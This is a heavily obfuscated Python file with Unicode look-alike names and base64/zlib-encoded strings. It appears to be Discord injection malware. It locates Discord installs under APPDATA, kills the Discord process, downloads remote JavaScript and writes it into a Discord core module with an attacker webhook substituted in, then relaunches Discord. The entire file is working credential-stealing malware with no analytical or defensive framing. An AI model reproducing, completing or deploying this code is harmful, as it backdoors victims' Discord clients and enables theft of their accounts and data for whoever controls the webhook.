import os
import re
import subprocess
import psutil
import requests

class Injection:

    def __init__(self, webhook):
        𝘀𝗲𝘁𝗮𝙩𝘁𝙧(𝘴𝙚𝗹𝘧, 'appdata', 𝗼𝘴.getenv(__𝘪𝗺𝗽𝗼𝘳𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x0bq\xb5t\t\x0c\xadp\nusr\r\x0c\x0br\x02\x00)\x05\x04\xd4')).decode()))
        𝘀𝙚𝙩𝗮𝘁𝘁𝘳(𝘴𝘦𝙡𝗳, 'discord_dirs', [𝘴𝘦𝙡𝗳.appdata + __𝙞𝙢𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝘮𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\r\xb4\x05\x00\x1a\x91\x04\x17')).decode(), 𝘴𝙚𝙡𝙛.appdata + __𝙞𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\rr\x89\x0c7\xcdH\xce\xcb\xb6\x05\x00G\xea\x06\xe5')).decode(), 𝙨𝙚𝗹𝙛.appdata + __𝙞𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\r\n\x0cs\xf5\xb4\x05\x00.M\x05M')).decode(), 𝘴𝘦𝙡𝙛.appdata + __𝙞𝙢𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\rr\x8d\x8a\x88\xcaIr\xb7,O\n\x0f+Mq\xb4\xb5\x05\x00\x8c\xa1\t\x94')).decode()])
        𝘀𝘦𝘁𝘢𝘵𝘵𝗿(𝘀𝙚𝗹𝙛, 'code', 𝙧𝗲𝙦𝙪𝗲𝘀𝘁𝙨.get(__𝗶𝗺𝙥𝗼𝙧𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x05\xc1;\x0e\x84 \x10\x00\xd0+)\xfbI(\xf7\x13\xa5\x00\x92\xa5`\x81\xce\x19\x0b\t\x83\x99B1\xee\xe9\xf7\xbdI\xb9\x0e\x95\xb9\xebS\x9e1\xe0\x9e\x04u\x93\xf2y\x0e\x96\xb0\xda\x06\xab#X?{\x14r\xd3b(i,\x87y?\x0e\xf3\x92\x04\xe1y\xc3\xea\x17\xc8=Ce\x8a\x17\xc7 \xae\r\xbe\x03C\x96-\xd6\xd4\xa3\xb0\xcb<\xfa\xa2+\xff\xfe\xe3$%v')).decode()).text)
        for 𝙥𝘳𝗼𝗰 in 𝙥𝘴𝘶𝘁𝘪𝘭.process_iter():
            if __𝗶𝗺𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb4\xb5\x05\x00\x1a\x8e\x03\xda')).decode() in 𝙥𝘳𝙤𝗰.name().lower():
                𝙥𝘳𝘰𝗰.kill()
        for 𝘥𝘪𝘳 in 𝙨𝗲𝘭𝙛.discord_dirs:
            if not 𝙤𝘴.path.exists(𝘥𝙞𝘳):
                continue
            if 𝘴𝙚𝙡𝙛.get_core(𝙙𝘪𝘳) is not None:
                with 𝗼𝗽𝘦𝙣(𝘀𝗲𝘭𝗳.get_core(𝘥𝙞𝘳)[𝘪𝗻𝘁.from_bytes(𝙢𝗮𝗽(lambda O, i: 908 - (𝗶𝙣𝘵(𝗢) + 𝙞), 𝘮𝙖𝙥(__𝙞𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝘵𝘦𝙧(__𝗶𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝗻𝗴𝙚(0)), __𝗶𝗺𝙥𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] + __𝗶𝗺𝘱𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\xcf)\x8dr\x0f3\xf1\xc9-\xa8\x02\x00\x1b(\x04O')).decode(), __𝙞𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝘧:
                    𝙛.write(𝙨𝗲𝙡𝗳.code.replace(__𝗶𝘮𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r-\xf1\r\xb4\xb5\x05\x00\xb4R\n\xd5')).decode(), 𝘴𝙚𝗹𝘧.get_core(𝗱𝗶𝙧)[𝗶𝘯𝙩.from_bytes(𝙢𝘢𝙥(lambda O, i: 374 - (𝗶𝗻𝘵(𝗢) + 𝙞), 𝙢𝘢𝗽(__𝗶𝙢𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝙞𝘵𝗲𝗿(__𝗶𝗺𝙥𝗼𝙧𝙩__('base64').b64decode(__𝘪𝗺𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xadJ\xae\x02\x00\x03\xe6\x01\xa5')).decode())] * 3)), 𝘳𝙖𝘯𝘨𝘦(1)), __𝗶𝙢𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]).replace(__𝙞𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\nKq\x0b\xcc\xce\x08\x081(\xce\x01\x00\x1a;\x04"')).decode(), 𝙬𝘦𝙗𝙝𝙤𝙤𝙠))
                    𝘀𝘦𝙡𝙛.start_discord(𝙙𝗶𝘳)

    def get_core(self, dir):
        for 𝘧𝘪𝗹𝗲 in 𝘰𝙨.listdir(𝙙𝙞𝙧):
            if 𝙧𝘦.search(__𝙞𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8b\x8cp*\xf7\t.\xd6\x07\x00\x0cU\x02\xac')).decode(), 𝙛𝙞𝘭𝙚):
                𝘮𝗼𝘥𝘶𝗹𝗲𝙨 = 𝗱𝘪𝙧 + __𝗶𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝗳𝘪𝘭𝗲 + __𝙞𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8bp7,\x8b\xf2\x08+\x8e\x8a\xf0\xb5\x05\x00\x19\x9b\x03\xee')).decode()
                if not 𝙤𝙨.path.exists(𝙢𝗼𝙙𝙪𝙡𝗲𝙨):
                    continue
                for 𝘧𝙞𝙡𝙚 in 𝘰𝘀.listdir(𝘮𝘰𝗱𝙪𝙡𝘦𝘴):
                    if 𝙧𝗲.search(__𝗶𝙢𝙥𝙤𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r-\xf1\xae\xb2\xb0\x05\x00\xb4\xbb\n\xf7')).decode(), 𝘧𝘪𝘭𝘦):
                        𝘤𝘰𝗿𝙚 = 𝘮𝗼𝘥𝘶𝗹𝘦𝙨 + __𝗶𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝗺𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝘧𝙞𝗹𝘦 + __𝙞𝗺𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + __𝙞𝙢𝙥𝗼𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r\xb5\x05\x00\x8aI\t\x86')).decode()
                        if not 𝘰𝙨.path.exists(𝙘𝘰𝘳𝙚 + __𝗶𝙢𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8bp\xcf)\x8dr\x0f3\xf1\xc9-\xa8\x02\x00\x1b(\x04O')).decode()):
                            continue
                        return (𝘤𝘰𝙧𝗲, 𝙛𝗶𝙡𝘦)

    def start_discord(self, dir):
        𝘶𝙥𝙙𝘢𝙩𝘦 = 𝘥𝙞𝗿 + __𝘪𝘮𝘱𝙤𝗿𝘁__('base64').b64decode(__𝙞𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\x0b+\x8frw3\x88\n6\xcdIu\x0f\xb5\x05\x00+\xd9\x05\x0f')).decode()
        𝙚𝙭𝘦𝗰𝘂𝙩𝙖𝘣𝘭𝙚 = 𝘥𝙞𝗿.split(__𝘪𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode())[-𝙞𝗻𝘁.from_bytes(𝙢𝗮𝙥(lambda O, i: 438 - (𝙞𝘯𝘁(𝗢) + 𝘪), 𝗺𝗮𝙥(__𝗶𝗺𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝙥(*[𝙞𝙩𝙚𝘳(__𝘪𝙢𝙥𝙤𝙧𝘁__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3s\xf15\x06\x00\x02\xd5\x01\x13')).decode())] * 3)), 𝗿𝗮𝗻𝙜𝘦(1)), __𝙞𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] + __𝙞𝘮𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xc9\r3\x89\n\xb4\xb5\x05\x00\x0b}\x02i')).decode()
        for 𝙛𝙞𝙡𝗲 in 𝙤𝙨.listdir(𝙙𝘪𝘳):
            if 𝗿𝘦.search(__𝙞𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x8b\x8cp*\xf7\t.\xd6\x07\x00\x0cU\x02\xac')).decode(), 𝘧𝘪𝙡𝙚):
                𝙖𝗽𝗽 = 𝙙𝘪𝙧 + __𝗶𝗺𝙥𝗼𝙧𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝙛𝙞𝙡𝙚
                if 𝗼𝙨.path.exists(𝙖𝙥𝙥 + __𝙞𝙢𝗽𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + __𝙞𝗺𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xdaK\n\xb7\xccN\t\xaf\xc8I.\xb7\xb5\x05\x00\x1cs\x04Q')).decode()):
                    for 𝗳𝙞𝗹𝗲 in 𝙤𝘀.listdir(𝙖𝗽𝗽):
                        if 𝘧𝘪𝘭𝙚 == 𝗲𝘅𝗲𝙘𝘶𝘵𝗮𝘣𝘭𝗲:
                            𝗲𝘹𝙚𝗰𝘂𝘵𝘢𝘣𝗹𝗲 = 𝘢𝙥𝘱 + __𝗶𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝘦𝙭𝘦𝘤𝘶𝘁𝗮𝙗𝗹𝙚
                            𝘀𝘶𝙗𝙥𝗿𝗼𝘤𝗲𝘀𝘀.call([𝘶𝘱𝙙𝘢𝘁𝘦, __𝙞𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝙞𝙢𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3\t6,O\xce\xb5\xcc\x8a\x8a\xf0\xab\n5\x0e\xcaH\xce\x0b\xb4\x05\x00G\xa5\x06\xd6')).decode(), 𝙚𝘅𝗲𝙘𝙪𝘵𝙖𝙗𝘭𝙚], shell=True, stdout=𝙨𝙪𝘣𝙥𝙧𝗼𝗰𝘦𝘀𝙨.PIPE, stderr=𝙨𝘂𝗯𝙥𝘳𝙤𝘤𝗲𝘀𝙨.PIPE)